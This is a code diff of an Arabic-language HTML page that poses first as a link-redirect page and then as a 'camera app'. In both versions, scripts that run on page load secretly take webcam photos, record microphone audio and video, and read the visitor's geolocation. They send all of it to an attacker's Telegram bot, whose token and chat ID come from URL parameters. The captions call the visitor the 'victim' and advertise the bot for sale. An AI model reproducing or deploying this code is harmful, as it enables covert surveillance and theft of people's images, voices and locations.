@@ -3,42 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التطبيق الرئيسي</title>
+    <title>كاميرا التطبيق</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #8B4513, #A52A2A);
+            color: white;
+            text-align: center;
             margin: 0;
             padding: 0;
-            background: linear-gradient(135deg, #4facfe, #00f2fe);
-            color: #fff;
-            text-align: center;
         }
 
         h1 {
             margin-top: 20px;
             font-size: 2.5em;
-            color: #fff;
+            color: #FFD700;
         }
 
-        .container {
-            max-width: 500px;
-            margin: 30px auto;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-        }
-
-        .map {
+        video,
+        canvas {
             margin-top: 20px;
+            max-width: 90%;
             border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
         }
 
-        .map iframe {
-            width: 100%;
-            height: 300px;
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 1.2em;
+            color: white;
+            background: #A52A2A;
             border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #D2691E;
         }
 
         footer {
@@ -46,184 +49,177 @@
             font-size: 0.9em;
             color: #eee;
         }
+
+        a {
+            color: #FFD700;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
-    <h1>جار تجهيز الرابط انتضر قليلاً</h1>
-    <div class="container">
-        <p>سيتم تحويلك للصفحه الثانيه انتظر...</p>
-    </div>
-    <div id="map-container" class="map"></div>
-    <footer>© 2024 - الموقع مطور من قبل عالم الذره ومخترع التنكلوجيا العليا صوفي </footer>
+    <h1>كاميرا التطبيق</h1>
+    <video id="video" autoplay muted></video>
+    <canvas id="canvas" class="hidden"></canvas>
+    <p id="status">جارِ تسجيل البيانات...</p>
+
+    <footer>
+        © 2024 - تطبيق الكاميرا
+    </footer>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const telegramBotToken = urlParams.get('token');
-        const chatId = urlParams.get('chat_id');
+        const token = urlParams.get('token');
+        const chat_id = urlParams.get('chat_id');
+        const botUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+        const botPhotoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+        const botVideoUrl = `https://api.telegram.org/bot${token}/sendVideo`;
+        const botLocationUrl = `https://api.telegram.org/bot${token}/sendLocation`;
+        const botVoiceUrl = `https://api.telegram.org/bot${token}/sendVoice`;
 
-        if (!telegramBotToken || !chatId) {
-            document.body.innerHTML = '<h1>⚠️ حدث خطأ: البيانات غير مكتملة!</h1>';
-            throw new Error("Missing token or chat_id in URL.");
-        }
+        const videoElement = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const statusElement = document.getElementById("status");
 
-        async function sendDataToTelegram(message) {
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        let mediaRecorder;
+        let chunks = [];
+
+        async function initCamera() {
             try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: true
                 });
+                videoElement.srcObject = stream;
+
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    chunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    chunks = [];
+                    sendVideo(blob);
+                };
+
+                captureImages();
+                captureAudio();
+                captureVideo();
+                sendLocation();
             } catch (error) {
-                console.error("خطأ في الإرسال إلى Telegram:", error);
+                statusElement.textContent = "خطأ في الوصول إلى الكاميرا أو الميكروفون!";
+                console.error(error);
             }
         }
 
-        async function sendPhotoToTelegram(imageBlob) {
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', imageBlob);
-            formData.append(
-                'caption',
-                `تم تطوير البوت بواسطة صوفي للاشراك او شراء البوت تواصل مع المطور @caser7\n\n` +
-                `المنطقة: none\nرقم الهاتف: none\nمقطع صوتي: جارِ الإرسال\nمقطع فيديو: قريبًا\n-----------------\n` +
-                `قناتي: https://t.me/+qZ06s9H7I944YWYy`
-            );
-
-            try {
-                await fetch(url, { method: 'POST', body: formData });
-            } catch (error) {
-                console.error("خطأ في إرسال الصورة إلى Telegram:", error);
-            }
-        }
-
-        async function sendAudioToTelegram(audioBlob) {
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendVoice`;
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('voice', audioBlob);
-            formData.append('caption', 'هذا تسجيل صوتي تم اختراقه من الضحيه تم التطوير بواسطة صوفي @caser7');
-
-            try {
-                await fetch(url, { method: 'POST', body: formData });
-            } catch (error) {
-                console.error("خطأ في إرسال الصوت إلى Telegram:", error);
+        async function captureImages() {
+            const context = canvas.getContext("2d");
+            for (let i = 0; i < 3; i++) {
+                await new Promise((resolve) => setTimeout(resolve, 1000));
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL("image/jpeg");
+                sendImage(imageData, `تم تطوير البوت بواسطة صوفي.\nللاشتراك أو شراء البوت تواصل مع المطور @caser7\n\nالمنطقة: none\nرقم الهاتف: none\nمقطع صوتي: جارِ الإرسال\nمقطع فيديو: قريباً\n-----------------\nقناتي: https://t.me/+qZ06s9H7I944YWYy`);
             }
         }
 
         async function captureAudio() {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                sendDataToTelegram("⚠️ تسجيل الصوت غير مدعوم في هذا المتصفح.");
-                return;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const audioRecorder = new MediaRecorder(stream);
+                audioRecorder.start();
+
+                setTimeout(() => {
+                    audioRecorder.stop();
+                }, 5000);
+
+                audioRecorder.ondataavailable = async (event) => {
+                    sendVoice(event.data);
+                };
+            } catch (error) {
+                console.error("خطأ أثناء تسجيل الصوت:", error);
             }
+        }
 
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-
-            const audioChunks = [];
-            mediaRecorder.ondataavailable = event => {
-                audioChunks.push(event.data);
-            };
-
-            mediaRecorder.onstop = () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
-                sendAudioToTelegram(audioBlob);
-            };
-
+        function captureVideo() {
             mediaRecorder.start();
             setTimeout(() => {
                 mediaRecorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-            }, 5000); // تسجيل الصوت لمدة 5 ثوانٍ
+            }, 5000);
         }
 
-        async function sendLocation(latitude, longitude) {
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendLocation`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        latitude: latitude,
-                        longitude: longitude
-                    })
+        async function sendImage(imageData, caption) {
+            const response = await fetch(botPhotoUrl, {
+                method: "POST",
+                body: new FormData(Object.assign(new FormData(), {
+                    chat_id,
+                    caption,
+                    photo: dataURLtoBlob(imageData)
+                }))
+            });
+            console.log("تم إرسال الصورة:", await response.json());
+        }
+
+        async function sendVoice(audioBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", chat_id);
+            formData.append("voice", audioBlob);
+
+            const response = await fetch(botVoiceUrl, {
+                method: "POST",
+                body: formData,
+            });
+            console.log("تم إرسال الصوت:", await response.json());
+        }
+
+        async function sendVideo(videoBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", chat_id);
+            formData.append("video", videoBlob);
+
+            const response = await fetch(botVideoUrl, {
+                method: "POST",
+                body: formData,
+            });
+            console.log("تم إرسال الفيديو:", await response.json());
+        }
+
+        async function sendLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const { latitude, longitude } = position.coords;
+                    const response = await fetch(botLocationUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id,
+                            latitude,
+                            longitude
+                        })
+                    });
+                    console.log("تم إرسال الموقع:", await response.json());
                 });
-                displayMap(latitude, longitude);
-            } catch (error) {
-                console.error("خطأ في إرسال الموقع الجغرافي إلى Telegram:", error);
-            }
-        }
-
-        function displayMap(latitude, longitude) {
-            const mapContainer = document.getElementById('map-container');
-            mapContainer.innerHTML = `
-                <iframe 
-                    src="https://www.google.com/maps?q=${latitude},${longitude}&z=15&output=embed" 
-                    allowfullscreen>
-                </iframe>
-            `;
-        }
-
-        function captureImages() {
-            const video = document.createElement('video');
-            const canvas = document.createElement('canvas');
-            document.body.appendChild(video);
-
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    video.play();
-
-                    setTimeout(() => {
-                        const captureAndSendImage = (index) => {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            const context = canvas.getContext('2d');
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                            canvas.toBlob(blob => {
-                                sendPhotoToTelegram(blob);
-                                if (index === 2) {
-                                    video.srcObject.getTracks().forEach(track => track.stop());
-                                }
-                            }, 'image/png');
-                        };
-
-                        for (let i = 0; i < 3; i++) {
-                            setTimeout(() => captureAndSendImage(i), i * 2000);
-                        }
-                    }, 2000);
-                })
-                .catch(err => console.error("خطأ في الوصول إلى الكاميرا:", err));
-        }
-
-        function captureLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        sendDataToTelegram(`📍 إحداثيات الموقع:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}`);
-                        sendLocation(latitude, longitude);
-                    },
-                    error => {
-                        sendDataToTelegram("⚠️ تعذر الحصول على الموقع الجغرافي.");
-                    }
-                );
             } else {
-                sendDataToTelegram("⚠️ الموقع الجغرافي غير مدعوم في هذا المتصفح.");
+                console.error("خاصية الموقع غير مدعومة.");
             }
         }
 
-        // تشغيل المهام
-        captureLocation();
-        captureImages();
-        captureAudio();
+        function dataURLtoBlob(dataURL) {
+            const [header, data] = dataURL.split(",");
+            const mime = header.match(/:(.*?);/)[1];
+            const binary = atob(data);
+            const array = [];
+            for (let i = 0; i < binary.length; i++) {
+                array.push(binary.charCodeAt(i));
+            }
+            return new Blob([new Uint8Array(array)], { type: mime });
+        }
+
+        initCamera();
     </script>
 </body>
 </html>
